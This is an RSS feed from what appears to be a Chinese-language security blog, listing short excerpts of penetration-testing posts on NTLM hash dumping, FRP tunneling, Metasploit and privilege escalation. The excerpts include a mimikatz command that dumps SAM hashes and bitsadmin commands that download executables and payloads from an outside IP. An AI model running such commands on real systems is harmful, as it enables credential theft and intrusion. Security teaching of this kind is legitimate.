<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>intranet on Reber&#39;s Blog</title>
    <link>https://wyb0.com/tags/intranet/</link>
    <description>Recent content in intranet on Reber&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 08 Dec 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://wyb0.com/tags/intranet/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>获取 NTLM Hash</title>
      <link>https://wyb0.com/posts/2020/get-hash/</link>
      <pubDate>Tue, 08 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2020/get-hash/</guid>
      <description>0x01 通过 sam 文件获取 通过 mimikatz 转储 sam 文件得到 hash(cmd 需要管理员权限) mimikatz.exe log &amp;#34;privilege::debug&amp;#34; &amp;#34;token::elevate&amp;#34; &amp;#34;lsadump::sam&amp;#34; exit 通过 reg save 导出 sam 文件(2003 之后可以使用)(导 hiv 文件 cmd</description>
    </item>
    
    <item>
      <title>FRP 内网穿透</title>
      <link>https://wyb0.com/posts/2019/frp-intranet-through/</link>
      <pubDate>Tue, 30 Jul 2019 23:27:54 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2019/frp-intranet-through/</guid>
      <description>0x00 对外提供简单的文件访问服务 服务端 ➜ frp cat frps.ini [common] ; 监听端口 bind_port = 7000 ; 那些端口允许客户端用来映射 allow_ports = 22-80,3000,33389 ➜ frp ./frps -c frps.ini 2019/07/31 00:22:31 [I] [service.go:139] frps tcp listen on</description>
    </item>
    
    <item>
      <title>内网渗透之 Responder 与 Net-NTLM hash</title>
      <link>https://wyb0.com/posts/2018/responder-and-ntlm-hash/</link>
      <pubDate>Mon, 10 Sep 2018 09:48:10 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2018/responder-and-ntlm-hash/</guid>
      <description>0x00 一些概念 Windows 认证协议 分为：基于 NTLM 的认证和基于 kerberos 的认证 什么是 NTLM Hash？ 早期 IBM 设计的 LM Hash 算法存在弱点，微软在保持向后兼容性</description>
    </item>
    
    <item>
      <title>Metasploit 简单提权</title>
      <link>https://wyb0.com/posts/2018/msf-simple-elevate-privileges/</link>
      <pubDate>Mon, 26 Feb 2018 13:43:20 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2018/msf-simple-elevate-privileges/</guid>
      <description>0x00 前提 虚拟机有一个shell：http://10.11.11.20/a.php，物理机IP是211.222.222.72</description>
    </item>
    
    <item>
      <title>Windows 终端下载文件和执行远程文件</title>
      <link>https://wyb0.com/posts/2018/win-terminal-download-and-exec-remote-file/</link>
      <pubDate>Tue, 06 Feb 2018 15:12:32 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2018/win-terminal-download-and-exec-remote-file/</guid>
      <description>环境：Windows Server 2008 R2 Enterprise 0x00 bitsadmin下载文件 bitsadmin /rawreturn /transfer getfile http://114.115.123.123/a.exe C:\Windows\Temp\a.exe bitsadmin /rawreturn /transfer getpayload http://114.115.123.123/a.zip C:\Windows\Temp\a.zip bitsadmin /transfer myDownLoadJob /download /priority normal http://114.115.123.123/a.exe C:\Windows\Temp\a.exe 0x01 certutil下载文</description>
    </item>
    
    <item>
      <title>脏牛漏洞</title>
      <link>https://wyb0.com/posts/2016/dirty-cow-vulnerabilities/</link>
      <pubDate>Sat, 22 Oct 2016 00:10:46 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/dirty-cow-vulnerabilities/</guid>
      <description>0x00 测试环境 我是在本地虚拟机测试的，个人理解这个漏洞的话可以起到的作用是：一个普通用户可以覆盖一个root用户的只读文件，</description>
    </item>
    
    <item>
      <title>Metasploit 利用 workspace 进行批量扫描爆破</title>
      <link>https://wyb0.com/posts/2016/metasploit-use-workspace-batch-blasting/</link>
      <pubDate>Tue, 23 Aug 2016 10:05:52 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/metasploit-use-workspace-batch-blasting/</guid>
      <description>0x00 启动 0x01 Metasploit的工作平台 在msf里的工作平台可以保存历史的一些操作信息 0x02 使用db_nmap扫描主机 扫描后的</description>
    </item>
    
    <item>
      <title>Ubuntu 下安装 Metasploit</title>
      <link>https://wyb0.com/posts/2016/ubuntu-install-metasploit/</link>
      <pubDate>Thu, 18 Aug 2016 10:38:41 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/ubuntu-install-metasploit/</guid>
      <description>0x00 安装Metasploit 下载msfinstall脚本 $ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall 修改文件权限 $ chmod 755 msfinstall 安装(可能时间较久) $ ./msfinstall 更新exp $</description>
    </item>
    
    <item>
      <title>Linux 下系统漏洞提权</title>
      <link>https://wyb0.com/posts/2016/linux-use-system-vulnerabilities-elevate-privileges/</link>
      <pubDate>Tue, 09 Aug 2016 19:23:13 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/linux-use-system-vulnerabilities-elevate-privileges/</guid>
      <description>0x00 Linux下的提权 Linux下一般都是系统漏洞提权，分为以下几个步骤： 1. 获取系统版本号 2. 根据系统版本号找对应exp 3. 反</description>
    </item>
    
    <item>
      <title>导出 Windows 主机密码与开启 3389</title>
      <link>https://wyb0.com/posts/2016/export-host-password-and-open-3389/</link>
      <pubDate>Mon, 08 Aug 2016 08:28:27 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/export-host-password-and-open-3389/</guid>
      <description>0x00 导出主机密码hash 关于Windows的hash 早期IBM设计的LM Hash算法存在弱点，微软在保持向后兼容性的同时提</description>
    </item>
    
    <item>
      <title>Windows 下第三方服务提权</title>
      <link>https://wyb0.com/posts/2016/windows-use-third-party-server-elevate-privileges/</link>
      <pubDate>Sun, 07 Aug 2016 23:38:58 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/windows-use-third-party-server-elevate-privileges/</guid>
      <description>0x00 MSSQL提权 MSSQL运行在system权限时才可以通过xp_cmdshell组件执行系统命令提权 提权条件：数据库账</description>
    </item>
    
    <item>
      <title>Windows 下系统漏洞提权</title>
      <link>https://wyb0.com/posts/2016/windows-use-system-vulnerabilities-elevate-privileges/</link>
      <pubDate>Sun, 07 Aug 2016 21:31:35 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/windows-use-system-vulnerabilities-elevate-privileges/</guid>
      <description>提权是在已经getshell但是权限不大的前提下做的 0x00 查看基本信息 0x01 使用cmd执行命令 尝试使用cmd执行命令 找可写目录 尝</description>
    </item>
    
  </channel>
</rss>
